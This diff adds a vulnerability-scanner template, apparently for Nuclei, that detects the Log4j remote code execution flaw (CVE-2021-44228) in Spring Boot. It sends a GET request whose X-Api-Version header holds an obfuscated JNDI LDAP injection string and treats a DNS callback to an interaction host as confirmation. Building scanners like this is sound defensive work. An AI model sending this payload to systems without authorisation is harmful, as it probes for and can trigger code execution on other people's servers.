@@ -1,0 +1,28 @@
+id: springboot-log4j-rce
+brief:
+    title: Spring Boot - Remote Code Execution (Apache Log4j)
+    by: pdteam
+    level: critical
+    about: Spring Boot is susceptible to remote code execution via Apache Log4j.
+    label:
+        - cve
+        - cve2021
+        - springboot
+        - rce
+        - oast
+        - log4j
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      head:
+        X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.{{interactsh-url}}}
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
